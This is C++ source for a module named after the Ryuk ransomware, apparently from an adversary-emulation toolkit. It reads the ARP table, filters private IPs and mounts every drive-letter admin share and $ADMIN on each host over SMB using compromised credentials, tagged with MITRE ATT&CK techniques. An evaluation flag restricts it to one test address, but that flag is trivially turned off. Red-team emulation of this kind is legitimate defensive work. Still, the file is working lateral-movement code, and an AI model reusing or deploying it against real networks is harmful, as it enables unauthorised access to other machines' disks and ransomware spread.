#include "mount_share_operations.h"

namespace ryuk {

    /*
     * Helper method to query and store the host ARP Table IPs.
     * 
     * Arguments
     *      ipAddresses - A vector of strings used to store all IPv4 addresses found.
     * 
     *  MITRE ATT&CK Techniques:
     *      T1016 - System Network Configuration Discovery
     * 
     * Returns
     *      None
    */
    void GetARPTableAddresses(std::vector<CHAR*>* ipAddresses)
    {
        MIB_IPNETTABLE* mibIPNetTable = nullptr;
        MIB_IPNETROW mibIPNetRow;
        ULONG ulTableSize = 0L;
        ULONG ulCallResult = 0L;

        _ftprintf_s(stdout, TEXT("[T1016] System Network Configuration Discovery with 'GetIpNetTable'...\n"));

        GetIpNetTable(mibIPNetTable, &ulTableSize, true);
        mibIPNetTable = new MIB_IPNETTABLE[ulTableSize];
        memset(mibIPNetTable, 0, sizeof(MIB_IPNETTABLE) * ulTableSize);
        ulCallResult = GetIpNetTable(mibIPNetTable, &ulTableSize, true);

        // If the function succeeds, the return value is NO_ERROR or ERROR_NO_DATA.
        if (ulCallResult == NO_ERROR || ulCallResult == ERROR_NO_DATA)
        {
            for (DWORD dwIndex = 0; dwIndex < mibIPNetTable->dwNumEntries; dwIndex++)
            {
                mibIPNetRow = mibIPNetTable->table[dwIndex];
                IN_ADDR inIPAddr;

                switch (mibIPNetRow.Type)
                {
                    case (MIB_IPNET_TYPE_DYNAMIC):
                    case (MIB_IPNET_TYPE_STATIC):
                        inIPAddr.s_addr = mibIPNetRow.dwAddr;
                        ipAddresses->push_back(new CHAR[16]{});
                        strncpy_s(ipAddresses->at(dwIndex), sizeof(CHAR) * 16, inet_ntoa(inIPAddr), 15);
                        break;

                    case (MIB_IPNET_TYPE_OTHER):
                    case (MIB_IPNET_TYPE_INVALID):
                    default:
                        break;
                }
            }
        }

        delete[] mibIPNetTable;
        return;
    }

    /*
     * Helper function to make best attempt at finding local addresses from the ARPTable query.
     * 
     * Arguments
     *      ipAddr - A string representing a IPv4 address X.X.X.X
     * 
     * Returns
     *      TRUE for any IP that is under 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16.
     *      FALSE otherwise.
    */
    BOOL IsLocalIP(const CHAR* ipAddr)
    {
        std::regex a10IP("^10\\.(\\d{1,3}\\.?)+$");
        std::regex a172IP("^172\\.((1[6-9]|2\\d|3[01]?)\\.){1}(\\d{1,3}\\.?)+$");
        std::regex a192IP("^192\\.168\\.\\d{1,3}\\.\\d{1,3}$");

        if (std::regex_match(ipAddr, a192IP))
        {
            return TRUE;
        }
        else if (std::regex_match(ipAddr, a172IP))
        {
            return TRUE;
        }
        else if (std::regex_match(ipAddr, a10IP))
        {
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }

    /*
     * Loops through all the IP addresses found from the GetARPTableAddresses() call.
     * Then tries to determine if the IP belongs to a private IP space, if successful
     * it will try to mount any possible DISK Resource to the host. It will loop through
     * all letters. If we run out of letters we then start to skip the entries.
     *
     *  Arguments:
     *      None
     *
     *  MITRE ATT&CK Techniques:
     *      T1021.002 - Remote Services: SMB/Windows Admin Shares
     *      T1135 - Network Share Discovery
     *
     *  Returns:
     *      None
    */
    void LoopAndAttemptDriveMountOnAddresses(std::vector<CHAR*>* ipAddresses, std::vector<LPNETRESOURCE>* resourceList, std::vector<std::wstring>* mountedDriveLetters)
    {
        const TCHAR driveLetters[]{
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
        };
        int availableLetters = 25;
        BOOL isLocal = FALSE;
        LPNETRESOURCE lpNewResource = nullptr;
        TCHAR* szLocalName = nullptr;
        TCHAR* szRemoteName = nullptr;

        // Special variables to limit the mounts only to the specified IP address and drive.
        TCHAR tEvalsMountShareLocation[] = TEXT("\\\\10.0.0.8\\C$");
        TCHAR bEvalsMode = TRUE;

        _ftprintf_s(stdout, TEXT("[T1135] Discovering Network Shares...\n"));

        // Looking for enumerating network shares resources only on local machine using WNetResourceOpen and WNetResourceEnum
        LPNETRESOURCE lpnr = NULL;
        EnumerateResources(lpnr, FALSE);

        for (std::vector<CHAR*>::const_iterator it = ipAddresses->cbegin(); it != ipAddresses->cend(); ++it)
        {
            isLocal = ryuk::IsLocalIP(*it);
            if (isLocal)
            {
                for (TCHAR letter = TEXT('A'); letter <= TEXT('Z'); letter++)
                {
                    TCHAR cLetter[]{ letter, TEXT('\0') };
                    lpNewResource = new NETRESOURCE();
                    szLocalName = new TCHAR[]{ driveLetters[availableLetters], TEXT(':'), TEXT('\0') };
                    szRemoteName = new TCHAR[MAX_PATH]{};

                    memset(lpNewResource, 0, sizeof(NETRESOURCE));
                    _sntprintf_s(szRemoteName, MAX_PATH, MAX_PATH - 1, TEXT("\\\\%hs\\%ls$"), *it, &cLetter);

                    lpNewResource->dwType = RESOURCETYPE_DISK;
                    lpNewResource->lpLocalName = szLocalName;
                    lpNewResource->lpRemoteName = szRemoteName;

                    if (availableLetters <= 0)
                    {
                        _ftprintf_s(stderr, TEXT("No more letters available!\n"));
                        continue;
                    }

                    if (bEvalsMode)
                    {
                        if (_tcscmp(tEvalsMountShareLocation, szRemoteName) == 0)
                        {
                            if (ryuk::MountShare(lpNewResource))
                            {
                                if (mountedDriveLetters != nullptr)
                                {
                                    mountedDriveLetters->push_back(szLocalName);
                                }
                                resourceList->push_back(lpNewResource);
                                availableLetters--;
                            }
                            else
                            {
                                delete lpNewResource;
                            }
                        }
                    }
                    else
                    {
                        if (ryuk::MountShare(lpNewResource))
                        {
                            if (mountedDriveLetters != nullptr)
                            {
                                mountedDriveLetters->push_back(szLocalName);
                            }
                            resourceList->push_back(lpNewResource);
                            availableLetters--;
                        }
                        else
                        {
                            delete lpNewResource;
                        }
                    }
                }

                // This section of the code would try to mount $ADMIN
                if (bEvalsMode == FALSE)
                {
                    lpNewResource = new NETRESOURCE();
                    memset(lpNewResource, 0, sizeof(NETRESOURCE));

                    if (availableLetters <= 0)
                    {
                        continue;
                    }

                    szLocalName = new TCHAR[]{ driveLetters[availableLetters], TEXT(':'), TEXT('\0') };
                    szRemoteName = new TCHAR[MAX_PATH]{};

                    _sntprintf_s(szRemoteName, MAX_PATH, MAX_PATH - 1, TEXT("\\\\%hs\\%ls"), *it, TEXT("$ADMIN"));

                    lpNewResource->dwType = RESOURCETYPE_DISK;
                    lpNewResource->lpLocalName = szLocalName;
                    lpNewResource->lpRemoteName = szRemoteName;

                    if (ryuk::MountShare(lpNewResource))
                    {
                        if (mountedDriveLetters != nullptr)
                        {
                            mountedDriveLetters->push_back(szLocalName);
                        }
                        resourceList->push_back(lpNewResource);
                        availableLetters--;
                    }
                    else
                    {
                        delete lpNewResource;
                    }
                }
            }
        }

        return;
    }

    /*
     * Helper cleanup function to disconnect any NET resources attached to the host prior mounting attempt.
     * 
     * Arguments
     *      resourceList - A vector of NET resources, each will be disconnected and then cleared.
     *      forceDisconnect - Boolean indicating whether to force the disconnect of the NET resource.
     * 
     * Returns
     *      None
     */
    void LoopAndUnmountMappedDrives(std::vector<LPNETRESOURCE>* resourceList, BOOL forceDisconnect)
    {
        for (std::vector<NETRESOURCE*>::iterator it = resourceList->begin(); it != resourceList->end(); ++it)
        {
            ryuk::DisconnectMountShare(*it, forceDisconnect);
        }
    }

    /*
     * Helper cleanup function to destroy any IP resources created by the Mounting Shares logic.
     *
     * Arguments
     *      ipResources - A vector of CHAR* that correspond to IP Addresses, each will be destroyed and the vector cleared.
     *
     * Returns
     *      None
     */
    void ClearIPResources(std::vector<CHAR*>* ipResources)
    {
        for (std::vector<CHAR*>::iterator it = ipResources->begin(); it != ipResources->end(); ++it)
        {
            delete* it;
        }
        ipResources->clear();
    }

    /*
     * Helper cleanup function to destroy any NetResources created by the Mounting Shares logic.
     *
     * Arguments
     *      resourceList - A vector of NET resources, each will be disconnected and then cleared.
     *
     * Returns
     *      None
     */
    void ClearNetResources(std::vector<LPNETRESOURCE>* resourceList)
    {
        for (std::vector<NETRESOURCE*>::iterator it = resourceList->begin(); it != resourceList->end(); ++it)
        {
            delete (*it)->lpLocalName;
            delete (*it)->lpRemoteName;
            delete* it;
        }

        resourceList->clear();
    }

    /*
     * Helper function used to mount a NET disk resource.
     * 
     * Arguments
     *      lpNetResource - A pointer to a NET resource structure.
     * 
     * Returns
     *      TRUE if the connection was successful, already assigned or already remembered
     *      FALSE otherwise.
     */
    BOOL MountShare(LPNETRESOURCE lpNetResource)
    {
        BOOL operationSuccess = FALSE;
        DWORD dwOperationResult = 0L;
        TCHAR szUserName[] = TEXT("");  // Replace with compromised creds: domain\\username
        TCHAR szPassword[] = TEXT("");  // Replace with compromised creds: plaintext password

        // Call the WNetAddConnection2 function to assign a drive letter to the share.
        dwOperationResult = WNetAddConnection2(lpNetResource, szPassword, szUserName, CONNECT_TEMPORARY);
        if (dwOperationResult == NO_ERROR)
        {
            _ftprintf_s(stdout, TEXT("Connection added %ls on drive %ls\n"), lpNetResource->lpRemoteName, lpNetResource->lpLocalName);
            operationSuccess = TRUE;
        }
        else if (dwOperationResult == ERROR_ALREADY_ASSIGNED)
        {
            _ftprintf_s(stdout, TEXT("Connection already assigned on drive %ls\n"), lpNetResource->lpLocalName);
            operationSuccess = TRUE;
        }
        else if (dwOperationResult == ERROR_DEVICE_ALREADY_REMEMBERED)
        {
            _ftprintf_s(stdout, TEXT("Attempted reassignment of remembered device %ls on drive %ls\n"), lpNetResource->lpRemoteName, lpNetResource->lpLocalName);
            operationSuccess = TRUE;
        }
        else if (dwOperationResult == ERROR_BAD_DEV_TYPE || dwOperationResult == ERROR_BAD_NETPATH)
        {
            // Just to suppress some of the error messages since we are trying every possible drive letter (A to Z).
        }
        else
        {
            _ftprintf_s(stderr, TEXT("Mount Error: %ld for %ls on drive %ls\n"), dwOperationResult, lpNetResource->lpRemoteName, lpNetResource->lpLocalName);
        }

        return operationSuccess;
    }

    /*
     * Helper method. Will disconnect NET resource from host.
     * 
     * Arguments
     *      lpNetResource - A pointer to a valid NET resource structure.
     *      forceDisconnect - Boolean to indicate whether to force disconnecting this resource.
     * 
     * Returns
     *      TRUE if disconnecting was successful.
     *      FALSE otherwise.
    */
    BOOL DisconnectMountShare(LPNETRESOURCE lpNetResource, BOOL forceDisconnect)
    {
        BOOL operationSuccess = FALSE;
        DWORD dwOperationResult = 0L;

        dwOperationResult = WNetCancelConnection2(lpNetResource->lpLocalName, 0L, forceDisconnect);
        if (dwOperationResult == NO_ERROR)
        {
            _ftprintf_s(stdout, TEXT("Disconnected successfully %ls\n"), lpNetResource->lpRemoteName);
            operationSuccess = TRUE;
        }
        else
        {
            _ftprintf_s(stderr, TEXT("Unmount Error: %ld\n"), dwOperationResult);
        }

        return operationSuccess;
    }

    BOOL EnumerateResources(LPNETRESOURCE lpNetResource, BOOL bVerbosePrint)
    {
        DWORD dwResult, dwResultEnum;
        HANDLE hEnum;
        DWORD cbBuffer = 16384;
        DWORD cEntries = -1;
        LPNETRESOURCE lpnrLocal = nullptr;
        DWORD i;

        // Call the WNetOpenEnum function to start the enumeration.
        dwResult = WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, NULL, lpNetResource, &hEnum);

        if (dwResult != NO_ERROR)
        {
            // Since we are recursively navigating the resources, eventually we will find an error
            // turn on verbose to observe the messages.
            if (bVerbosePrint)
            {
                _ftprintf_s(stderr, TEXT("WnetOpenEnum failed with error %d\n"), dwResult);
            }
            return FALSE;
        }

        lpnrLocal = (LPNETRESOURCE)GlobalAlloc(GPTR, cbBuffer);

        if (lpnrLocal == nullptr)
        {
            _ftprintf_s(stderr, TEXT("WnetOpenEnum memory allocation failed with error %d\n"), dwResult);
            return FALSE;
        }

        do
        {
            ZeroMemory(lpnrLocal, cbBuffer);

            dwResultEnum = WNetEnumResource(hEnum, &cEntries, lpnrLocal, &cbBuffer);

            if (dwResultEnum == NO_ERROR)
            {
                for (i = 0; i < cEntries; i++)
                {
                    // Call an application-defined function to
                    //  display the contents of the NETRESOURCE structures.
                    if (bVerbosePrint)
                    {
                        ryuk::VerbosePrintResource(i, &lpnrLocal[i]);
                    }

                    // If the NETRESOURCE structure represents a container resource,
                    // use EnumerateFunc function recursively.
                    if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[i].dwUsage & RESOURCEUSAGE_CONTAINER))
                    {
                        if (!ryuk::EnumerateResources(&lpnrLocal[i], bVerbosePrint))
                        {
                            if (bVerbosePrint)
                            {
                                _ftprintf_s(stdout, TEXT("EnumerateFunc returned FALSE\n"));
                            }
                        }
                    }
                }
            }
            else if (dwResultEnum != ERROR_NO_MORE_ITEMS)
            {
                _ftprintf_s(stderr, TEXT("WNetEnumResource failed with error %d\n"), dwResultEnum);
                break;
            }
        } while (dwResultEnum != ERROR_NO_MORE_ITEMS);

        GlobalFree((HGLOBAL)lpnrLocal);

        dwResult = WNetCloseEnum(hEnum);

        if (dwResult != NO_ERROR)
        {
            _ftprintf_s(stderr, TEXT("WNetCloseEnum failed with error %d\n"), dwResult);
            return FALSE;
        }

        return TRUE;
    }

    void VerbosePrintResource(int i, LPNETRESOURCE lpNetResourceLocal)
    {
        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Scope: "), i);
        switch (lpNetResourceLocal->dwScope)
        {
        case (RESOURCE_CONNECTED):
            _ftprintf_s(stdout, TEXT("connected\n"));
            break;
        case (RESOURCE_GLOBALNET):
            _ftprintf_s(stdout, TEXT("all resources\n"));
            break;
        case (RESOURCE_REMEMBERED):
            _ftprintf_s(stdout, TEXT("remembered\n"));
            break;
        default:
            _ftprintf_s(stdout, TEXT("unknown scope %d\n"), lpNetResourceLocal->dwScope);
            break;
        }

        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Type: "), i);
        switch (lpNetResourceLocal->dwType)
        {
        case (RESOURCETYPE_ANY):
            _ftprintf_s(stdout, TEXT("any\n"));
            break;
        case (RESOURCETYPE_DISK):
            _ftprintf_s(stdout, TEXT("disk\n"));
            break;
        case (RESOURCETYPE_PRINT):
            _ftprintf_s(stdout, TEXT("print\n"));
            break;
        default:
            _ftprintf_s(stdout, TEXT("unknown type %d\n"), lpNetResourceLocal->dwType);
            break;
        }

        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] DisplayType: "), i);
        switch (lpNetResourceLocal->dwDisplayType)
        {
        case (RESOURCEDISPLAYTYPE_GENERIC):
            _ftprintf_s(stdout, TEXT("generic\n"));
            break;
        case (RESOURCEDISPLAYTYPE_DOMAIN):
            _ftprintf_s(stdout, TEXT("domain\n"));
            break;
        case (RESOURCEDISPLAYTYPE_SERVER):
            _ftprintf_s(stdout, TEXT("server\n"));
            break;
        case (RESOURCEDISPLAYTYPE_SHARE):
            _ftprintf_s(stdout, TEXT("share\n"));
            break;
        case (RESOURCEDISPLAYTYPE_FILE):
            _ftprintf_s(stdout, TEXT("file\n"));
            break;
        case (RESOURCEDISPLAYTYPE_GROUP):
            _ftprintf_s(stdout, TEXT("group\n"));
            break;
        case (RESOURCEDISPLAYTYPE_NETWORK):
            _ftprintf_s(stdout, TEXT("network\n"));
            break;
        default:
            _ftprintf_s(stdout, TEXT("unknown display type %d\n"), lpNetResourceLocal->dwDisplayType);
            break;
        }

        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Usage: 0x%x = "), i, lpNetResourceLocal->dwUsage);
        if (lpNetResourceLocal->dwUsage & RESOURCEUSAGE_CONNECTABLE)
            _ftprintf_s(stdout, TEXT("connectable "));
        if (lpNetResourceLocal->dwUsage & RESOURCEUSAGE_CONTAINER)
            _ftprintf_s(stdout, TEXT("container "));
        _ftprintf_s(stdout, TEXT("\n"));

        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Localname: %ls\n"), i, lpNetResourceLocal->lpLocalName);
        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Remotename: %ls\n"), i, lpNetResourceLocal->lpRemoteName);
        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Comment: %ls\n"), i, lpNetResourceLocal->lpComment);
        _ftprintf_s(stdout, TEXT("NETRESOURCE[%d] Provider: %ls\n"), i, lpNetResourceLocal->lpProvider);
        _ftprintf_s(stdout, TEXT("\n"));
        return;
    }
} // namespace ryuk
